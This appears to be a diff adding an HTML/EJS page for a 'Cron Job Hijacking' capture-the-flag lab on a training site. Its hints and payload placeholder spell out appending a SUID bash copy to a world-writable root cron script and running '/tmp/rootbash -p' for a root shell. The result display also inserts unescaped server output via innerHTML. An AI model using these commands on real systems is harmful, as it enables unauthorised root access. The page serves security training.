@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1><i class="fas fa-clock"></i> Cron Job Hijacking</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
+    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Identify writable cron job scripts that run as root. Inject a payload into the script to escalate privileges when the cron job executes.</p></div>
+    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Cron Jobs</h2>
+      <div class="code-block">
+        <h4>Active Cron Jobs:</h4>
+        <pre><% if (systemInfo && systemInfo.cronJobs) { systemInfo.cronJobs.forEach(function(job) { %>
+<%= job %>
+<% }); } %></pre>
+      </div>
+      <div class="vulnerable-form" style="margin-top:1rem;">
+        <div style="margin-bottom:1rem;">
+          <label for="cronTarget">Target Script Path:</label>
+          <input type="text" id="cronTarget" placeholder="/opt/scripts/backup.sh" value="">
+        </div>
+        <div style="margin-bottom:1rem;">
+          <label for="cronPayload">Payload to Inject:</label>
+          <textarea id="cronPayload" rows="3" style="width:100%;background:var(--bg-dark);color:var(--text);border:1px solid var(--primary-dim);padding:0.5rem;font-family:monospace;" placeholder="cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"></textarea>
+        </div>
+        <button class="btn" onclick="injectCron()"><i class="fas fa-syringe"></i> Inject Payload</button>
+      </div>
+      <div id="cronResults" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block">
+        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
+        <pre>
+# Find writable cron scripts:
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /opt/scripts/
+
+# If script is world-writable:
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
+
+# Wait for cron execution, then:
+/tmp/rootbash -p
+        </pre>
+      </div>
+    </div>
+    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('privesc-cron','flagInput_cron','flagResult_cron'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_cron" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_cron" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function injectCron() {
+      const target = document.getElementById('cronTarget').value;
+      const payload = document.getElementById('cronPayload').value;
+      const resultsDiv = document.getElementById('cronResults');
+      resultsDiv.innerHTML = '<p style="color:var(--primary)"><i class="fas fa-spinner fa-spin"></i> Injecting payload...</p>';
+      try {
+        const res = await fetch('/api/labs/privesc/cron', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ target, payload }) });
+        const data = await res.json();
+        resultsDiv.innerHTML = '<pre style="color:' + (data.success ? '#00ff00' : 'var(--text)') + ';white-space:pre-wrap;">' + (data.output || data.error) + '</pre>';
+      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
+    }
+  </script>
+</body>
+</html>
